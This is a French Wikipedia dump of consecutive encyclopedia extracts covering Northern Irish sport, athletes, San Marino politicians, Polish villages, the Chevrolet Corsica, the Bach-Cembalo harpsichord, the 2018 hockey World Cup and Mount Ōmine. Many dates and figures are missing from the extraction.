Le rugby, exactement comme les sports gaéliques, bénéficie d'une organisation transnationale regroupant l'État d'Irlande et l'Irlande du Nord. Les joueurs nord-irlandais jouent donc sous les couleurs de l'île d'Irlande unifiée. L' est une des meilleures équipes dans le monde, placée dans le premier niveau mondial d'après l'. À 2016, elle a remporté le tournoi des Six Nations dont deux grands chelems, le dernier en 2009. L'IRFU existe depuis 1880. L'équipe d'Ulster, représente une aire géographique comprenant l'Irlande du Nord et les autres comtés d'Ulster de la république d'Irlande. Elle dispute la ligue celtique et la (coupe Heineken). L'Ulster a gagné cette dernière en 1998-1999.
En hockey sur glace, les de l'Irlande du Nord disputent l', la ligue professionnelle de hockey britannique (et seule ligue à regrouper Angleterre, Écosse, Pays de Galles et Irlande du Nord), compétition qu'ils ont gagnée deux fois, la dernière victoire remontant à la saison 2005-2006. En cricket aussi, la base de l'organisation est transnationale : l'Irlande s'est qualifiée pour la Coupe du monde de cricket en éliminant l'équipe du Pakistan. Quant au golf, l'actuel mondial est le Nord-irlandais Rory McIlroy.
Pour les Jeux olympiques, grâce à un accord entre les comités olympiques irlandais et britannique et avec la permission du Comité international olympique, les sportifs originaires d'Irlande du Nord ont la possibilité de concourir soit pour la Grande-Bretagne, soit pour l'Irlande.
Enfin, l'Irlande du Nord envoie sa propre délégation d'athlètes aux Jeux du (la république d'Irlande ne faisant pas partie du ).
Hymnes.
Officiellement, , l'hymne du Royaume-Uni, est aussi l'hymne de l'Irlande du Nord et est employé par l'équipe d'Irlande du Nord de football, mais il est parfois vu comme un chant partisan unioniste.
C'est pourquoi le est joué quand l'Irlande du Nord participe à certaines rencontres sportives, notamment les Jeux du.
L'équipe irlandaise de rugby, qui comprend la république d'Irlande et l'Irlande du Nord, utilise un hymne spécialement composé, , mais on chante aussi l'hymne national de la république, "", quand on joue à Dublin.

</doc>

<doc id="8977965" url="https://fr.wikipedia.org/wiki?curid=8977965" title="Championnats du monde juniors de natation 2015">
Championnats du monde juniors de natation 2015

La édition des Championnats du monde juniors de natation se déroule à Singapour du 25 au .
Les catégories concernées sont :

</doc>
<doc id="8977970" url="https://fr.wikipedia.org/wiki?curid=8977970" title="Gertrud Sigurdsen">
Gertrud Sigurdsen

Gertrud Sigurdsen, née le à Tunaberg (Comté de Södermanland) et morte le à Stockholm, est une femme politique suédoise, membre du Parti social-démocrate.
Biographie.
Secrétaire et ombudsman de la Confédération des syndicats suédois de 1949 à 1982, elle a travaillé notamment dans l'industrie automobile et pour le gouvernement provincial du Södermanland. Elle a siégé au parlement suédois de 1969 à 1991 et a fait partie du gouvernement à trois reprises: secrétaire d'État à la Coopération (1973-1976), ministre de la Santé (1982-1985) et ministre des Affaires sociales (1985-1989).

</doc>
<doc id="8977973" url="https://fr.wikipedia.org/wiki?curid=8977973" title="Allie Morrison">
Allie Morrison

Alvin Roy Morrison dit Allie Morrison, né le à Marshalltown (Iowa) et mort le à Omaha (Nebraska), est un lutteur libre américain.
Il obtient la médaille d'or olympique en 1928 à Amsterdam en catégorie poids plumes, devenant ainsi le premier champion olympique de l'Iowa.

</doc>
<doc id="8977974" url="https://fr.wikipedia.org/wiki?curid=8977974" title="Giacomo Giuseppe Saratelli">
Giacomo Giuseppe Saratelli

Giacomo Giuseppe Saratelli (Bologne, 1682 - Venise, 1762) est un organiste, compositeur et maître de chapelle italien.
Biographie.
Organiste à Bologne où il compose son premier oratorio en 1699, il est actif en Padoue en 1714, en 1736 il devient Premier organiste de la Basilique Saint-Marc. En 1740, il devient vice-maître de la Cappella Marciana. De 1732 à 1739, il est maître de chœur à l'Ospedale dei Mendicanti à Venise, une des écoles de musique les plus prestigieuses du temps. En 1747, il devient Maître Directeur à Saint-Marc, poste qu'il garde jusqu'à sa mort, advenue en 1762.

</doc>
<doc id="8977981" url="https://fr.wikipedia.org/wiki?curid=8977981" title="2011 CP4">
2011 CP4



</doc>
<doc id="8977984" url="https://fr.wikipedia.org/wiki?curid=8977984" title="William Dally">
William Dally

William Dally est un rameur d'aviron américain né le à Elmira (Californie) et mort le dans la même ville.
Biographie.
Il dispute les épreuves d'aviron aux Jeux olympiques d'été de 1928 à Amsterdam où il remporte la médaille d'or en huit.

</doc>
<doc id="8977985" url="https://fr.wikipedia.org/wiki?curid=8977985" title="Ally mcbeal">
Ally mcbeal



</doc>
<doc id="8977988" url="https://fr.wikipedia.org/wiki?curid=8977988" title="Tomasz Zielinski">
Tomasz Zielinski



</doc>
<doc id="8977997" url="https://fr.wikipedia.org/wiki?curid=8977997" title="Rhamphocephalus">
Rhamphocephalus

"" est un genre fossile de ptérosaures. Il vivait au Jurassique dans ce qui est aujourd'hui l'Angleterre. Selon "Paleobiology Database" en 2025, ce genre "Rhamphocephalus" ce genre avait pour première espèce décrite , mais celle-ci est nomen dubium du genre depuis 2018.
Ce genre "Rhamphocephalus" reste avec deux espèces référencées ' et '.
Historique.
Le genre "Rhamphocephalus" est décrit en 1880 par le paléontologue britannique Harry Govier Seeley (1839-1909) en même temps que l'espèce "R. prestwichi" Seeley, 1880. Mais cette dernière espèce est déclaré nomen dubium du genre Rhamphocephalus en 2018 par O'Sullivan &amp; Martill.
Synonyme.
Selon "Paleobiology Database" en 2025, ce genre "Rhamphocephalus" a un seul synonyme :
Fossiles.
Selon "Paleobiology Database" en 2025, ce genre "Rhamphocephalus" a sept collections référencées de fossiles. Ces sept collections sont du Bathonien inférieur du Jurassique moyen à l'Oxfordien du Jurassique supérieur, c'est-à-dire date de avant notre ère.
Répartition.
Ces sept collections proviennent toutes d'Angleterre au Royaume-Uni.
Liste des espèces.
Selon "Paleobiology Database" en 2025, ce genre "Rhamphocephalus" a deux espèces référencées :
Description.
Son envergure est d'environ . Les seuls ossements qu'on a trouvé sont des fragments de mâchoire et d'ailes. Ceux-ci ont été découverts dans le village de dans le comté d'Oxfordshire.
Classification.
En 2012, une révision de la taxonomie des ptérosaures du Jurassique anglais réalisée par de Michael O'Sullivan le conduit à proposer que :

</doc>
<doc id="8978000" url="https://fr.wikipedia.org/wiki?curid=8978000" title="Geoffrey Kamworor">
Geoffrey Kamworor



</doc>
<doc id="8978001" url="https://fr.wikipedia.org/wiki?curid=8978001" title="Geoffrey Kipsang">
Geoffrey Kipsang



</doc>
<doc id="8978007" url="https://fr.wikipedia.org/wiki?curid=8978007" title="Libre Parcours (album)">
Libre Parcours (album)



</doc>
<doc id="8978012" url="https://fr.wikipedia.org/wiki?curid=8978012" title="Chevrolet Corsica">
Chevrolet Corsica

La Chevrolet Corsica est une automobile produite par Chevrolet de 1987 à 1996. Elle est appelée aussi Pontiac Tempest au Canada et produite de 1987 à 1991.
Changements d'une année à l'autre.
1987-1989.
La Corsica a été vendue pour la première fois en tant que flotte de voitures à des agences de location et à de grandes entreprises en 1987, avant sa sortie générale. La Corsica et la Beretta étaient les deuxièmes voitures les plus vendues en Amérique en 1988, juste derrière la Chevrolet Celebrity. De nombreuses Corsica ont également été vendues à l'étranger, quelques-unes ont été vendues en Europe, aux Pays-Bas par exemple. Une grande partie des composants de la suspension ont été empruntés à la Chevrolet Cavalier à carrosserie J et le châssis était une extension de celui de la carrosserie J, mais modélisé avec des proportions similaires à celles de la carrosserie N. Cependant, la plate-forme L a été conçue par Chevrolet plutôt que par Oldsmobile. La voiture était équipée soit du quatre cylindres en ligne OHV TBI 2,0 L de la Cavalier, soit du V6 OHV MPFI 2,8 L de la Chevrolet Celebrity. Les poignées de porte de la Corsica de base étaient de couleur argent, tandis que les Corsica LT et LTZ avait des poignées de couleur noire. Certains modèles antérieurs avaient un levier de vitesses sur colonne avec un frein à main entre les sièges avant, une configuration peu courante pour la plupart des voitures compactes de l'époque. Un modèle à hayon 5 portes a été introduit pour 1989, tout comme une finition de performances LTZ qui comprenait de nombreuses pièces de suspension de la Beretta. Une finition rare, XT, comprenait toutes les pièces de performance de la finition LTZ ainsi qu'un intérieur en cuir, un kit de carrosserie spécial et un ensemble de spoilers conçus pour GM par un fournisseur tiers.
1990.
Le modèle de base de la Corsica a été abandonné, laissant les LT et LTZ. Les deux moteurs proposés ont augmenté en cylindrée. La Corsica utilisait désormais le même moteur à quatre cylindres de 2,2 L et la transmission automatique à 3 vitesses que la Cavalier, ou le V6 de 3,1 L et la boîte automatique à 3 vitesses de la Lumina. Des modifications mineures ont été apportées à l'intérieur, principalement autour des commandes du conducteur.
1991.
Pour 1991, la Corsica a reçu un intérieur largement mis à jour avec un airbag standard côté conducteur et des porte-gobelets. Les ceintures de sécurité avant ont été déplacées des portes vers les montants B. Les feux arrière ont également reçu une refonte, de lisse à striée. Ce serait également la dernière année pour la berline 5 portes.
1992.
Le seul niveau de finition était la LT. La transmission manuelle a été abandonnée pour le V6; il est resté disponible pour le moteur à quatre cylindres, bien qu'il ne soit disponible que sur commande spéciale (dont peu ont jamais ont pris place) Le moteur à soupapes en tête de 2,2 L a maintenant été mis à niveau avec un Sequential Fuel-Injection (SFI) en Corse, contrairement à la version de la Cavalier qui utilisait un Multi-Point Fuel Injection (MPFI).
1993.
Sur les véhicules à transmission automatique, un verrouillage de changement de vitesse, qui exigeait que la pédale de frein soit appliquée avant que la transmission ne puisse être retirée de la position Parking, ainsi qu'un voyant de niveau d'huile bas ont été ajoutés. Les voitures équipées du V6 3,1 L ont également perdu l'insigne de garde-boue "3.1L Multi-Port V6".
1994.
Le modèle LT a de nouveau remplacé le modèle de base. La puissance du moteur de 2,2 L a été augmentée à 120 ch. Le V6 de 3,1 L a été remplacé par le moteur Gen III «série 3100» mis à jour (code d'option L82) avec une puissance de 160 ch et un système OBD-1.5. Ce nouveau système OBD n'était pas compatible avec OBD-I ou OBD-II mais incluait certaines fonctionnalités des deux systèmes.
Le système de climatisation a maintenant été mis à niveau (R134) pour être réfrigérant, par opposition au modèle Freon nocif pour l'environnement.
La transmission automatique à 3 vitesses sur les modèles V6 a été remplacée par une transmission automatique à commande électronique à 4 vitesses avec surmultiplication et lubrifiée avec un liquide pour longue durée de 100 000 miles. Le moteur 2,2 L conserve la même boîte automatique à 3 vitesses, mais la boîte automatique à 4 vitesses peut être commandée spécialement. Les ceintures de sécurité avant ont été déplacées des montants B vers les portes.
1995.
La Corsica est devenue la première voiture américaine à être équipée de série de feux de jour. Un nouveau logo Corsica a été introduit, ainsi que d'autres modifications mineures de l'extérieur, comme l'introduction de rétroviseurs, de moulures latérales et de calandre couleur carrosserie. La voiture a également reçu une suspension arrière révisée, similaire à celle de la Cavalier alors nouvellement repensé. Cela a légèrement réduit le "flottement" de la conduite qui se produisait avec les modèles précédents. Toutes les Corsica sont désormais équipées de liquide de refroidissement Dex-Cool. La voiture a également reçu une nouvelle taille de pneu, 195 / 70R14 pour une durée de vie plus longue et une meilleure maniabilité. 
1996.
La Corsica a été entièrement convertie en OBD-II. GM a abandonné la Corsica et la Chevrolet Beretta après l'année modèle 1996, en raison des normes de sécurité de 1997 qui auraient nécessité une refonte totale de ces voitures et aurait fait de la concurrence à la Chevrolet Cavalier de 1995 de taille similaire pour les ventes de voitures compactes. La Corsica a été remplacée par la Chevrolet Malibu plus grande pour l'année modèle 1997.
La production a pris fin le 26 juin 1996.
Moteurs.
Notes :

</doc>
<doc id="8978017" url="https://fr.wikipedia.org/wiki?curid=8978017" title="Edwin Milton Abbott">
Edwin Milton Abbott

Edwin Milton Abbott, né le à Philadelphie, et mort le à Abington, est un avocat et poète américain. Il a étudié à l'. Il a obtenu le Bachelor of Laws en 1896 puis a été admis au barreau.
Biographie.
Il a été admis au barreau en 1896 et s'est ensuite distingué dans les affaires criminelles. Il a été conseiller juridique principal dans la lutte des banlieusards de Philadelphie contre les chemins de fer, un membre de la Assemblée générale de Pennsylvanie, 1911-1912, président de la Commission sur la révision du droit pénal dans l'État de Pennsylvanie, 1912-1915 et 1917-1923, et en 1913, candidat minoritaire à la magistrature de la Cour des moyens communs. Il a été nommé secrétaire de l'Institut Américain du Droit pénal et de la Criminologie en 1913.

</doc>
<doc id="8978020" url="https://fr.wikipedia.org/wiki?curid=8978020" title="Andrea Belluzzi">
Andrea Belluzzi

Andrea Belluzzi, né le à Saint-Marin, est un avocat et homme d'État saint-marinais, membre du Parti des socialistes et des démocrates. Il est capitaine-régent de Saint-Marin, avec Roberto Venturini, du au .
Biographie.
Pilote automobile semi-professionnel depuis 1990, Andrea Belluzzi exerce la profession d'avocat.
Membre du Parti des socialistes et des démocrates depuis 2007, il est élu membre du Grand Conseil général en 2012. Le , il est élu capitaine-régent, avec Roberto Venturini. Les deux hommes entrent en fonction le suivant pour un semestre.

</doc>
<doc id="8978022" url="https://fr.wikipedia.org/wiki?curid=8978022" title="Aloha, Scooby-Doo!">
Aloha, Scooby-Doo!



</doc>
<doc id="8978023" url="https://fr.wikipedia.org/wiki?curid=8978023" title="Bach-Cembalo">
Bach-Cembalo

Le Bach-Cembalo ou Bach-Flügel (« Clavecin de Bach ») désigne en allemand un clavecin ancien, exposé au Musikinstrumenten-Museum de Berlin sous le numéro d'inventaire 316. On a longtemps cru qu'il avait appartenu à Jean-Sébastien Bach. Bien que cela n'ait pas pu être confirmé, cette hypothèse demeure plausible.
De ce fait, et bien que sa disposition actuelle, issue d'une transformation, la légende qui le relie au grand compositeur en a fait un instrument mythique qui a fortement influencé la facture des débuts de la renaissance du clavecin au tournant des .
Historique.
En 1890, à l'instigation du biographe et spécialiste de J.S. Bach, Philipp Spitta, un grand clavecin allemand datant du entre, sous le N° de catalogue 316, dans la collection de la Berliner Hochschule für Musik qui l'acquiert du collectionneur Paul de Wit pour 10.000 marks, à cette époque un montant considérable.
Sa disposition, unique parmi les clavecins survivants, est de , au clavier inférieur et , au supérieur, et il passe — de façon non documentée — pour avoir appartenu à J.S. Bach. Oskar Fleischer, successeur de Spitta à la direction du musée après le décès de ce dernier, confirme que, selon lui, ce "Bachflügel" a bien été propriété du compositeur, ajoutant que son facteur était Gottfried Silbermann et qu'il a été hérité de son père par Wilhelm Friedemann Bach.
Partiellement partagées en 1922 par Curt Sachs (qui doute notamment de l'attribution à Silbermann), mises en doute dès 1924 par Georg Kinsky (qui doutait notamment de l'originalité du jeu de 16 pieds, qu'il jugeait inapproprié à la musique baroque), ces conclusions seront démenties bien plus tard, en 1955, par le restaurateur du musée, Friedrich Ernst dans son ouvrage "Der Flügel Johann Sebastian Bach" ; le jeu de 16 pieds et la légendaire "Bachdisposition", sérieusement mis en doute par Kinsky et Ernst, allaient perdre considérablement d'importance dans la vision moderne de la musique baroque. La mise en doute de l'importance, voire de l'existence du jeu de 16' en général sur la base d'un seul instrument est étonnante ; les clavecins de Hieronymus Albrecht Hass, ainsi que les descriptions de Jakob Adlung devaient être connus par ces auteurs.
À cause de son jeu de 16 pieds, ainsi qu'à cause de sa prétendue provenance, il a été intimement lié à la question du rôle que ce jeu pouvait avoir pour Johann Sebastian Bach. Les publications plus tardives à ce sujet (quasi uniquement en allemand), qui allaient, pour une deuxième fois, totalement bouleverser nos connaissances sur cet instrument (ainsi que sur le jeu de 16 pieds) n'allaient quasiment plus être prises en compte par la pratique de la musique ancienne.
En 1985 Herbert Heyde publiait un texte qui démontrait que non seulement les clavecins avec jeu de 16 pieds étaient connus à Leipzig du vivant de Bach, mais que la légendaire "Bachdisposition" y existait au moins une fois : il s'agissait d'un clavecin construit par Zacharias Hildebrandt. En 1770 ce clavecin Hildebrandt était au Richterschen Garten, un pavillon d'été qui auparavant avait appartenu au Zimmermannsche Kaffeehaus, célèbre pour les concerts réguliers par Bach et son Collegium Musicum. Cet article a notamment eu comme conséquence de vérifier l'authenticité du 16 pied du "Bach-Cembalo" et a permis d'arriver à de nouvelles conclusions.
Ce clavecin aurait été construit par Johann Heinrich Harrass (père) vers 1700. À son état d'origine il présentait la disposition de 1 x 16', 1 x 4' au premier clavier, et un jeu de 8' au deuxième clavier. Il possédait dès le début un chevalet commun pour les jeux de 16' et de 8', ce qui explique sa taille modeste, comparable à l'autre clavecin Harrass conservé au château de Sondershausen qui, lui, n'a pas de 16 pieds. Néanmoins il avait un sillet de 8' ainsi que de 16'; ainsi qu'une partie de sommier surélevée pour le 16'; éléments dont les traces ont permis d'identifier la disposition originale. La disposition actuelle (1 x 16' et 1 x 8' au premier clavier et 1 x 8' et 1 x 4' au deuxième) a été mise en place très tôt et dans l'atelier d'origine.
Beaucoup de modifications ont suivi. Le fond, le couvercle, les décorations à droite et à gauche des claviers et le piètement ne sont pas originaux. L'authenticité des claviers n'est pas certaine. À l'origine il était peint en blanc avec des bordures dorées avec un intérieur rouge. Il a été repeint en noir à une date inconnue. La peinture a été enlevée en 1955.
Une première « copie », en fait une adaptation plus ou moins inspirée par cet instrument mythique est réalisée en 1899 par Wilhelm Hirl et sera suivie de plusieurs autres.
Peu de copies se rapprochant de son état d'origine ont été faites. Il faut cependant mentionner les deux reconstructions faites par Horst Rase qui représentent le clavecin dans son état d'origine à trois jeux, ainsi qu'après sa première modification avec ses quatre jeux. Ces deux copies se trouvent dans le Musikinstrumentenmuseum à Berlin Jürgen Ammer a aussi fabriqué des copies, cependant toutes à quatre jeux.
On estime aujourd'hui que ce clavecin, attribué au facteur Johann Heinrich Harrass, a été construit vers 1700, et que sa disposition actuelle n'est pas originale, mais probablement faite par le facteur d'origine. Le fait qu'il aurait pu appartenir à Bach reste purement hypothétique.
L'instrument n'est plus jouable (la structure ne supporterait plus la tension des cordes), et non susceptible de nouvelle restauration.
Description.
Dans son état actuel, c'est un grand clavecin à deux claviers de couleurs inversées (marches noires et feintes blanches) avec accouplement à tiroir dont l'étendue est de 5 octaves (Fa à Fa). Le clavier inférieur possède deux registres (16 et 8 pieds), le clavier supérieur possède aussi deux registres : 8 pieds avec jeu de luth, et 4 pieds. Le module des cordes est de 330 mm.
La caisse est en hêtre avec éclisse courbe doublement incurvée en « S », à la manière hambourgeoise.
Ses dimensions sont : longueur 2470 mm - largeur 958 mm - hauteur 305 mm.
La décoration est minimale ; dans son état actuel, le bois est laissé brut. La caisse repose sur trois pieds tournés de forme conique (non d'origine, que Curt Sachs compare à des pattes d'éléphant), d'une hauteur de 565 mm assurant une hauteur au niveau des touches de 650 mm. L'aspect d'ensemble est lourd et massif.
Reconstitution de l'itinéraire historique.
Les études menées par plusieurs chercheurs, évoquant une véritable enquête de détective, ont permis de débrouiller l'histoire compliquée de ce clavecin, d'en identifier avec une bonne certitude le facteur, les propriétaires successifs et les multiples modifications l'ayant amené à son état actuel. Un faisceau concordant d'indices laisse très peu de doutes sur la validité des conclusions auxquelles ont mené ces analyses et investigations.
Identification du facteur.
La première mention d'un instrument précisément décrit, pouvant rappeler, ou même être le clavecin N°316 du Musikinstrumenten-Museum de Berlin se trouve chez Jakob Adlung dans son traité "Musica mechanica organoedi", publié à Berlin en 1768, mais rédigé bien avant cette date, au plus tard en 1726. Dans son traité, Adlung décrit un clavecin de Großbreitenbach, ville ou travaillaient au les membres d'une famille de facteurs, les Harrass, actifs dans cette cité de 1624 jusqu'au . Au Großbreitenbach appartenait à la Principauté de Schwarzbourg-Sondershausen. Or, la description faite par Adlung évoque fortement un clavecin daté de 1710, aujourd'hui conservé au Château de Sondershausen, et présentant plusieurs caractéristiques très proches du "Bach-Cembalo" et telles qu'on peut supposer qu'ils proviennent tous deux du même atelier. Ce clavecin comportait apparemment encore en 1909, la signature de Johann Heinrich Harrass (facteur né en 1665 à Großbreitenbach), signature disparue depuis lors, probablement à la suite d'une restauration de l'instrument. La description par Adlung concorde également avec la disposition d'origine du Bach-Cembalo telle qu'on peut la supposer. Son attribution à un des membres de la famille Harrass ne fait presque plus débat ; à la suite d'Hubert Henkel, les spécialistes s'accordent aussi sur le prénom du facteur : Johann Heinrich, avec une ambigüité sur la personne puisqu'ils sont deux à porter ce double prénom : Johann Heinrich (1665-1714) et Johann-Heinrich (1707-1778) - le plus probable étant l'aîné, au regard de la date de rédaction du traité d'Adlung. Reste évoquée cependant la construction par Johann Martin Harrass (1671-1746), autre membre de la famille.
Identification des propriétaires successifs.
Paul de Wit avait acheté l'instrument à Wilhelm Rust, professeur de musique à Berlin et plus tard Cantor de l'église Saint-Thomas de Leipzig (donc lointain successeur de Johann Sebastian Bach à ce poste). Lors des tractations commerciales avec le musée de Berlin, de Wit affirma que ce clavecin avait été construit pour J.S. Bach selon ses spécifications, que Wilhelm Friedemann Bach l'avait hérité de son père, puis étant dans la gêne, l'avait cédé au comte Otto von Voß, tout comme il l'avait fait de nombreuses partitions lui venant de son père. Voss l'aurait à son tour vendu au compositeur Friedrich Wilhelm Rust (1739-1796), le grand-père de Wilhelm Rust, lequel l'aurait ainsi reçu par héritage. Autant de dires qui n'étaient étayés par aucune preuve formelle.
En l'absence d'éléments probants, Oskar Fleischer avait quant à lui émis l'hypothèse que ce clavecin avait été construit par Gottfried Silbermann à l'intention de Carl Philipp Emanuel Bach.
De fait, dès 1860, mention avait été faite de cet instrument dans la préface du volume 9 de l'édition complète des œuvres de Bach. L'auteur en était précisément Wilhelm Rust, membre éminent de la Bach-Gesellschaft.
Celui-ci y citait « un grand clavecin que nous avons vu à Berlin chez le comte [Otto Carl Philipp] von Voss ». Ce comte von Voss, fils d'Otto Carl Friedrich déjà cité, lui aurait affirmé - selon une note de bas de page - que le clavecin datait du milieu du siècle précédent, et qu'il avait été touché de nombreuses fois par Wilhelm Friedemann Bach. Dans cette préface, il n'était nullement question que l'instrument ait pu appartenir à Johann Sebastian Bach, ni qu'il ait pu être construit selon ses instructions, ni même qu'il ait appartenu à Wilhelm Friedemann.
Reste la question de la façon dont le clavecin a pu entrer en possession de Wilhelm Rust. Dans une lettre datée du , peu de temps avant sa mort, celui-ci affirme que ce clavecin est celui que son ancêtre a acheté au comte von Voss ; on ne possède plus la lettre originale, mais seulement une citation indirecte et partielle datant de 1937 : d'après Martin Elste, selon toute probabilité, il lui aurait été cédé par la famille von Voss entre 1860 et 1890.
Reste à mentionner que ni von Voss, ni Wilhelm Friedemann Bach ne sont des candidats probables à se procurer un clavecin de la province de Thuringe du début du . Cependant Johann Sebastian Bach est un candidat probable ; il est thuringien et a épousé Maria Barbara Bach, qui vient de Gehren, ville voisine de Großbreitenbach, en 1707. Dans le neu-eröffnetes Orchester, Johann Mattheson décrit des « clavecins, avec leurs trois ou quatre jeux » en 1713, ce qui démontre que des clavecins de taille importante, tels que ceux décrits dans les journaux hambourgeois plus tardifs ou ceux conservés par Hass, étaient déjà considérés comme assez normaux. Bach, inspiré par ces grands clavecins hambourgeois, et habitué à demander des modifications de disposition, du moins en ce qui concerne les orgues, aurait bien pu y voir le clavecin de ses rêves à un prix modéré. La modification a donc été faite de manière peu coûteuse, par exemple en réutilisant le sommier d'origine.
Transformations et modifications.
À l'origine ce clavecin présentait trois jeux: 16' et 4' au premier clavier, 8' au deuxième. Déjà dans la première moitié du la disposition fut changée: un deuxième 8' fut ajouté, le 4' mis au deuxième clavier. Pendant les nombreuses modifications successives, la structure interne, trop faible (présentant les mêmes problèmes que le clavecin à Sondershausen) fut renforcée, la position des trous des chevilles modifiée au moins une fois, le fond et le couvercle ainsi que le piètement furent remplacés. L'authenticité des claviers reste à vérifier. La peinture blanche originale fut remplacée par une peinture noire, puis enlevée-
Place et influence dans la renaissance du clavecin.
Son importance artistique et historique, totalement surestimée par les experts, en fait de façon paradoxale un instrument mythique. Il restera, avec le clavecin Pleyel de 1889, à la base du renouveau du clavecin au pendant plus de cinquante ans : selon Martin Elste, 

</doc>
<doc id="8978026" url="https://fr.wikipedia.org/wiki?curid=8978026" title="Belluzzi">
Belluzzi



</doc>
<doc id="8978028" url="https://fr.wikipedia.org/wiki?curid=8978028" title="Alonzo de Ercilla">
Alonzo de Ercilla



</doc>
<doc id="8978029" url="https://fr.wikipedia.org/wiki?curid=8978029" title="Alois Nizigama">
Alois Nizigama



</doc>
<doc id="8978030" url="https://fr.wikipedia.org/wiki?curid=8978030" title="Roberto Venturini">
Roberto Venturini

Roberto Venturini, né le à Saint-Marin, est un médecin et homme d'État saint-marinais, membre du Parti démocrate-chrétien. Il est capitaine-régent de Saint-Marin, avec Andrea Belluzzi, du au .
Biographie.
Médecin, Roberto Venturini travaille au service des urgences du centre hospitalier de Saint-Marin. 
Membre du Parti démocrate-chrétien, il est élu membre du Grand Conseil général en 2012. Le , il est élu capitaine-régent, avec Andrea Belluzzi. Les deux hommes entrent en fonction le suivant pour un semestre.

</doc>
<doc id="8978032" url="https://fr.wikipedia.org/wiki?curid=8978032" title="Alpes du Sud (Nouvelle Zélande)">
Alpes du Sud (Nouvelle Zélande)



</doc>
<doc id="8978036" url="https://fr.wikipedia.org/wiki?curid=8978036" title="Alpha galactosidase">
Alpha galactosidase



</doc>
<doc id="8978037" url="https://fr.wikipedia.org/wiki?curid=8978037" title="Rzeczków-Kolonia">
Rzeczków-Kolonia

Rzeczków-Kolonia (prononciation : ) est un village polonais de la gmina de Wierzbica dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978038" url="https://fr.wikipedia.org/wiki?curid=8978038" title="Alpha-phellandrène">
Alpha-phellandrène



</doc>
<doc id="8978041" url="https://fr.wikipedia.org/wiki?curid=8978041" title="Stanisławów (Radom)">
Stanisławów (Radom)

Stanisławów (prononciation : ) est un village polonais de la gmina de Wierzbica dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au nord de Wierzbica (siège de la gmina), au sud-ouest de Radom (siège de le powiat) et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978044" url="https://fr.wikipedia.org/wiki?curid=8978044" title="Agnes Jebet">
Agnes Jebet



</doc>
<doc id="8978045" url="https://fr.wikipedia.org/wiki?curid=8978045" title="Jebet Tirop">
Jebet Tirop



</doc>
<doc id="8978046" url="https://fr.wikipedia.org/wiki?curid=8978046" title="Suliszka">
Suliszka

Suliszka (prononciation : ) est un village polonais de la gmina de Wierzbica dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'est de Wierzbica (siège de la "gmina"), au sud de Radom (siège du "powiat") et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978048" url="https://fr.wikipedia.org/wiki?curid=8978048" title="Coupe du monde masculine de hockey sur gazon 2018">
Coupe du monde masculine de hockey sur gazon 2018

La de la Coupe du monde masculine de hockey sur gazon se tient du 28 novembre au 16 décembre 2018 à Bhubaneswar, dans l'État indien d'Odisha, réunissant pour la première fois 16 équipes. La cérémonie d'inauguration qui s'est tenue le 27 novembre 2018, 
vu le plus grand spectacle de vol de drones en Inde.
La Belgique remporte la coupe du monde pour la première fois en battant en finale les Pays-Bas.
Annonce.
En mars 2013, un mois après que la FIH a publié le document sur le processus d'attribution des événements pour le cycle 2014-2018, l'Australie, la Belgique, l'Inde, la Malaisie et la Nouvelle-Zélande ont été présélectionnées comme candidats pour accueillir l'événement et ont été invitées à soumettre un dossier d'appel d'offres, une exigence que la Belgique ne respectait pas. De plus, un mois avant l'élection hôte, l'Australie a retiré sa candidature pour des raisons techniques et financières. L'Inde a été annoncée comme hôte le 7 novembre 2013, lors d'une cérémonie spéciale à Lausanne en Suisse.
Équipes qualifiées.
En marge des demi-finales de la Ligue mondiale, les 10/11 équipes les mieux classées, les 4 champions continentaux et le pays hôte les rejoignent.
Format.
Les 16 équipes ont été réparties en quatre groupes comprenant chacun quatre équipes. Les équipes se rencontrent une fois. L'équipe classée première dans chaque groupe se qualifie directement pour les quarts de finale, tandis que les équipes classées deuxièmes et troisièmes dans chaque groupe participent à des matchs de barrage. À partir de là, le tournoi se joue en phase à élimination directe.
Arbitres.
La Fédération internationale de hockey sur gazon désigne 16 arbitres pour la compétition: 
Premier tour.
Le calendrier est publié le 27 février 2018.
Toutes les heures correspondent à l'heure normale de l'Inde ().
Poule A.
Source: FIH
En cas d'égalité de points de plusieurs équipes à l'issue des matchs de poule, les critères suivants sont appliqués dans l'ordre indiqué pour établir leur classement:
Poule B.
Source: FIH
En cas d'égalité de points de plusieurs équipes à l'issue des matchs de poule, les critères suivants sont appliqués dans l'ordre indiqué pour établir leur classement:
Poule C.
Source: FIH
En cas d'égalité de points de plusieurs équipes à l'issue des matchs de poule, les critères suivants sont appliqués dans l'ordre indiqué pour établir leur classement:
Poule D.
Source: FIH
En cas d'égalité de points de plusieurs équipes à l'issue des matchs de poule, les critères suivants sont appliqués dans l'ordre indiqué pour établir leur classement:
Classement final.
Source: FIH
En cas d'égalité de points de plusieurs équipes à l'issue des matchs de poule, les critères suivants sont appliqués dans l'ordre indiqué pour établir leur classement :
Acteurs de la compétition.
Récompenses.
Les prix suivants ont été remis à la fin du tournoi :
Buteurs.
157 buts ont été inscrits en 36 rencontres soit une moyenne de 4.36 buts par match.

</doc>
<doc id="8978049" url="https://fr.wikipedia.org/wiki?curid=8978049" title="Mont Ōmine">
Mont Ōmine

Le est une des 100 montagnes célèbres du Japon, située dans la préfecture de Nara au Japon et culminant à d'altitude.
Officiellement appelé , il est plus connu sous le nom mont Ōmine en raison de sa hauteur de culminance au sein des monts Ōmine. Il fait partie du parc national de Yoshino-Kumano dans la région du Kansai de l'île Honshū.
L'Ōminesan-ji au sommet de la montagne est le quartier général de la secte shugendō du bouddhisme au Japon et toute la montagne constitue un terrain de pèlerinage et de formation pour les "yamabushi".
Histoire.
Le monastère du mont Ōmine est fondé au par En no Gyōja comme centre de la nouvelle religion qu'il a fondée, le shugendō. « Shugendō » signifie littéralement « la voie de la formation et l'évaluation » et se base sur l'auto-actualisation de la puissance spirituelle sous forme expérimentale grâce à de difficiles et rigoureuses épreuves de courage et de dévouement appelées "shugyō".
